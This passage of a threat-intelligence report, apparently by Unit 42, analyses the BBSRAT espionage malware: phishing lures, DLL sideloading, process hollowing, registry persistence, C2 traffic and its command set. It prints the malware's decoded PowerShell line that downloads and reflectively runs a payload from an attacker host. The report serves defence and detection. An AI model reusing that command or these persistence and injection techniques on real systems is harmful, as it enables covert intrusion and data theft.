The attack was\nfound to heavily rely on RTF exploits and at the time, thought to make use of the PlugX malware\nfamily.\n\nESET did not attribute the attacks to a particular attack group, but noted that the objective of the\ncampaign was espionage and general information stealing. Based on data collected from Palo Alto\n[Networks AutoFocus threat intelligence, we discovered continued operations of activity very similar](https://www.paloaltonetworks.com/products/platforms/subscriptions/autofocus.html)\nto the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a\nconcentration of attacks in late October and continuing into December.\n\nThe adversaries behind these attacks continued to target Russia and other Russian speaking\nnations using similar exploits and attack vectors. However, while the malware used in these new\nattacks uses similar infection mechanisms to PlugX, it is a completely new tool with its own specific\nbehavior patterns and architecture. We have named this tool “BBSRAT.”\n\n## Targeting and Infrastructure\n\nAs described in earlier reports on “Roaming Tiger”, the attack observed in August 2015 used\nweaponized exploit documents that leave Russian language decoy document files after infecting\nthe system. The files exploit the well-known Microsoft Office vulnerability, CVE-2012-0158, to\nexecute malicious code in order to take control of the targeted systems.\n\n\n-----\n\nFigure 1 Spear-phishing email delivering BBSRAT\n\nIn one case, the adversary impersonated an individual from the organization Vigstar, a Russianbased research organization in charge of the development of satellite communications and special\npurpose wireless devices for the Russian Federation’s defense and security agencies. The\ntargeted email address appeared to be a Gmail account associated with Vigstar as well, and was\nfound on a job board website for a job opening at Vigstar.\n\nThe rough translation of the body of the email is as follows:\n\n_I send you a \"list of international exhibitions of military, civil and dual-purpose, conducted in 2015_\n_on the territory of the Russian Federation and foreign states.\" Waiting for your reply!_\n\nFigure 2 confirms that the decoy document that opens after the malware infects the system is\nindeed a list of international exhibitions that were conducted on Russian territory in 2015.\n\n\n-----\n\nFigure 2 Decoy document that is opened after the malicious document has infected the system\n\nIn more recent months, we have identified several other potential Russian victims using\nAutoFocus. Analysis of the command and control (C2) infrastructure shows that the newly\ndiscovered samples of BBSRAT used the same C2 domains as previously published in the\n“Roaming Tiger” campaign, including transactiona[.]com and futuresgold[.]com. Interestingly, all of\nthe previously published C2 domains have significant overlap amongst the hashes and IPs while\nC2s for BBSRAT contain no overlap at all. This may indicate that for the newer attack campaign\nusing BBSRAT, the adversary may have deployed purpose-built variants and/or infrastructure for\neach of the intended targets.\n\n\n-----\n\nFigure 3 Command and control infrastructure\n\n## BBSRAT Malware Analysis\n\n**Deployment Technique #1**\n\nBBSRAT is typically packaged within a portable executable file, although in a few of the observed\ninstances, a raw DLL was discovered to contain BBSRAT. When the dropper first runs, it will\ngenerate a path in the %TEMP% directory. The generated filename is 10-16 uppercase alphabetic\ncharacters, and ends with a ‘.TMP’ file extension. The dropper will continue to write an embedded\ncab file in this location.\n\nFigure 4 Header of CAB file dropped by BBSRAT\n\n\n-----\n\nThe malware will proceed to create one of the following directories depending on what version of\nMicrosoft Windows is running on the target machine:\n\n%ALLUSERSPROFILE%\\SSONSVR\n%ALLUSERSPROFILE%\\Application Data\\SSONSVR\n\n[Using the built-in expand.exe utility provided by Microsoft Windows, the dropper executes the](https://support.microsoft.com/en-us/kb/80751)\nfollowing command, which will expand the CAB file and write the results to the provided directory:\n\n_expand.exe \"%TEMP%\\[temp_file]\" Destination \"[chosen_path]\\SSONSVR\"_\n\nThis results in the following three files being written to the SSONSVR directory:\n\naclmain.sdb\npnipcn.dll\nssonsvr.exe\n\n[The 'ssonsvr.exe' file is a legitimate Citrix executable that will be used to sideload the malicious](https://attack.mitre.org/wiki/DLL_side-loading)\n‘pnipcn.dll’ file. The ‘aclmain.sdb’ file contains code that will eventually be loaded by the ‘pnipcn.dll’\nfile.\n\n[The malware finally executes ‘ssonsvr.exe’ via a call to ShellExecuteW.](https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx)\n\nFigure 5 Execution flow of dropper expanding CAB file\n\nWhen ‘ssonsvr.exe’ is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path\nto msiexec.exe, by expanding the following environment string:\n\n_%SystemRoot%\\System32\\msiexec.exe_\n\nIt will then spawn a suspended instance of msiexec.exe in a new process. The malware proceeds\nto load code from the ‘aclmain.sdb’ file and performs process hollowing against this instance of\nmsiexec.exe prior to resuming the process.\n\nFigure 6 Sideloading execution flow\n\nIn order to ensure persistence, the following registry key is written on the victim’s machine:\n\n\n-----\n\n_HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe : [path_to_ssonsvr.exe]_\n\n**Deployment Technique #2**\n\nIn the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed\n[via a downloader that used the Invoke-ReflectivePEInjection.ps1 script from the PowerSploit](https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1)\nframework.\n\nWhen the downloader executes, it will first decrypt the following two strings using a 5-byte XOR\nkey of “\\x01\\x02\\x03\\x04\\x05”:\n\n_\"powershell -exec bypass -c IEX (New-Object_\n_Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke-ReflectivePEInjection -PEUrl_\n_http://testzake[.]com/s.exe\"_\n\n_\"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell -exec bypass -c IEX (New-_\n_Object Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke-ReflectivePEInjection_\n_-PEUrl http://testzake[.]com/s.exe\"_\n\nThese strings are then sequentially executed via calls to WinExec. As we can see, the second\ncommand is specifically crafted to run on 64-bit versions of Microsoft Windows. The commands in\nquestion will download an executable file and run it within the context of the powershell process.\n\nWhen the above commands are executed, the downloader will initially download the ‘IR.ps1’\npowershell script from the specified URL:\n\nFigure 7 Downloader downloading the Invoke-ReflectivePEInjection PowerSploit script\n\nThis Powershell script appears to have been pulled directly from the PowerSploit framework, with\nno modifications made. The malware then invokes this script with a URL that points to an\nadditional executable file. This downloaded executable contains a copy of the BBSRAT malware\nfamily.\n\nThe downloader proceeds to drop either a 32-bit or 64-bit DLL file that will execute the two\npreviously stated Powershell commands when the DLL is loaded. This DLL is dropped to one of\nthe following locations:\n\n\n-----\n\n_%SYSTEMROOT%\\web\\srvcl32.dll_\n\n_%APPDATA%\\web\\srvcl32.dll_\n\nAdditionally, the following registry keys are set depending on the system’s CPU architecture:\n\n_HKU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-_\n_0c966feabec1}\\InprocServer32\\ThreadingModel - \"Both\"_\n_HKU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32\\Default_\n\n_- [path_to_srvcl32.dll]_\n\n_HKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-_\n_85FFC23AF9C1}\\InprocServer32\\ThreadingModel - \"Both\"_\n_HKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-_\n_85FFC23AF9C1}\\InprocServer32\\Default - [path_to_srvcl32.dll]_\n\nThe COM object for {42aedc87-2188-41fd-b9a3-0c966feabec1} is specific to ‘MruPidlList’, while\nthe COM object for {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} is specific to ‘Microsoft\nWBEM New Event Subsystem’. This ensures that the DLL specified will load when Microsoft\n[Windows starts. It is a technique that was used by the ZeroAccess rootkit when it initially surfaced.](https://nakedsecurity.sophos.com/2012/06/06/zeroaccess-rootkit-usermode/)\n\n**BBSRAT Execution**\n\nAfter being loaded using one of the two techniques discussed, BBSRAT malware begins execution\nby loading the following libraries at runtime:\n\nntdll.dll\nkernel32.dll\nuser32.dll\nadvapi32.dll\ngdi32.dll\nws2_32.dll\nshell32.dll\npsapi.dll\nSecur32.dll\nWtsApi32.dll\nNetapi32.dll\nVersion.dll\nCrypt32.dll\nWininet.dll\n\nThe following mutex is then created to ensure a single instance of BBSRAT is running at a given\ntime:\n\n_Global\\GlobalAcProtectMutex_\n\nThroughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as\nseen in the example below demonstrating BBSRAT making a call to the WSAStartup function:\n\n\n-----\n\nFigure 8 BBSRAT calling WSAStartup function\n\nThe malware proceeds to parse the stored embedded network configuration and spawns a series\nof threads responsible for network communication. This includes a series of HTTP or HTTPS\nrequests, such as the following:\n\n_GET /bbs/1/forum.php?sid=1 HTTP/1.1_\n_Cookie: A46A8AA9-D7D6-43FB-959DC96E_\n_Content-Length:_\n_User-Agent: Mozilla/4.0 (compatible; Windows NT 5.1)_\n_Connection: Keep-Alive_\n_Host: transactiona[.]com_\n_Cache-Control: no-cache_\n_Accept: */*_\n_Content-Type:_\n\nIn the above example, the ‘1’ used both in the URI and the sid GET parameter is a global\nincremental counter. Every subsequent request made by BBSRAT increments this counter by one.\nAdditionally, all variants of BBSRAT we have found use the same URL for command and control\n(C2) communication.\n\nWhen first executed, the malware will exfiltrate data about the victim’s machine via a POST\nrequest to the ‘/bbs/[counter]/forum.php?sid=[counter]’ URL. All network data sent via POST\nrequests uses a custom binary structure, as defined as the following:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nstruct network_header\n{\nDWORD random;\nDWORD hardcoded0;\nDWORD hardcoded1;\nDWORD command;\nDWORD length_of_compressed_data;\nDWORD length_of_decompressed_data;\nDWORD unknown2;\nBYTE compressed_data[];\n};\n\n\n-----\n\nThe compressed_data field is compressed using the common ZLIB compression algorithm.\nAdditionally, in the event data is being sent via HTTP rather than HTTPS, the following additional\nencryption algorithm is applied to the POST data:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\ndef decrypt(data):\nout = []\nfor x in data:\nt = (ord(x) - 23)\nt1 = (t ^ 62)\nt2 = (t1 + 23) & 0xFF\nout.append(chr(t2))\nreturn out\n\n\nThe following data structure holds the victim’s information that is uploaded by BBSRAT:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nstruct victim_information\n{\nDWORD static_value;\nDWORD major_version;\nDWORD minor_version;\nDWORD build_number;\nDWORD platform_id;\nDWORD default_locale;\nDWORD unknown;\nDWORD local_ip_address;\nDWORD running_as_64_bit;\nDWORD random;\nDWORD unknown2;\nDWORD struct_length;\nDWORD struct_with_not_used_length;\nDWORD struct_with_username_length;\nDWORD struct_with_group_length;\nDWORD unknown3;\nDWORD struct_with_hostname_length;\nWCHAR not_used[??];\nWCHAR username[??];\nWCHAR group[??];\nWCHAR hostname[??];\n};\n\n\nBBSRAT accepts many possible commands that the C2 server can provide. These commands are\nsent as a response to the GET beacons that are continually requested via either HTTP or HTTPS.\nThe following commands and sub-commands have been identified:\n\n**Command** **Sub-command** **Description**\n\n0x110010 N/A Beacon\n\n0x110011 N/A Uninstall/Kill Malware\n\n0x110020 N/A Upload Victim Information\n\n\n-----\n\n0x110064 0x2 Execute Command and Return Response\n\n0x110064 0x4 Unknown\n\n0x110064 0x5 Execute Shellcode\n\n0x110066 0x7 Query Service Configuration\n\n0x110066 0x9 Start Service\n\n0x110066 0xa Stop Service\n\n0x110066 0xb Delete Service\n\n0x110066 0xc Change Service Configuration\n\n0x110063 0xd Enumerate Running Processes\n\n0x110063 0xf Kill Process\n\n0x110063 0x10 Get Process Information\n\n0x110063 0x12 Free Library for Specified Process\n\n0x110065 0x1b Execute Command Quietly\n\n0x110065 0x1e Send Input to Console\n\n0x110065 0x1f Execute Shellcode\n\n0x110061 0x20 List Drive Information\n\n0x110061 0x21 List File Information For Given Directory\n\n0x110061 0x23 Write File\n\n0x110061 0x24 Read File\n\n0x110061 0x25 List File Information For Given Directory\n\n0x110061 0x27 Perform File Operation via SHFileOperation()\n\n0x110061 0x28 Delete File\n\n0x110061 0x29 Create Directory\n\n0x110061 0x2a Shell Execute\n\nPlease refer to the appendix for a full list of identified BBSRAT samples and their associated C2\nservers.\n\n## Conclusion\n\n\n-----\n\nAs in many of the previous articles regarding espionage-motivated adversaries and possible\nnation-state campaigns, what is being observed in this attack campaign is a continued operation\nand evolution by the adversary even after its tactics, techniques, and procedures (TTPs) have\nbecome public knowledge. Despite the fact that the information about these attackers has been\npublic for over a year, including a listing of many of the command and control servers, they\ncontinue to reuse much of their exposed playbook. We urge organizations to use the data from\nUnit 42 and other threat intelligence sources is paramount to proactively secure themselves and\nprevent attacks.\n\n[WildFire properly classifies BBSRAT malware samples as malicious. We have released DNS](https://www.paloaltonetworks.com/products/technologies/wildfire.html)\nsignatures to block access to the C2 domain names included in this report.
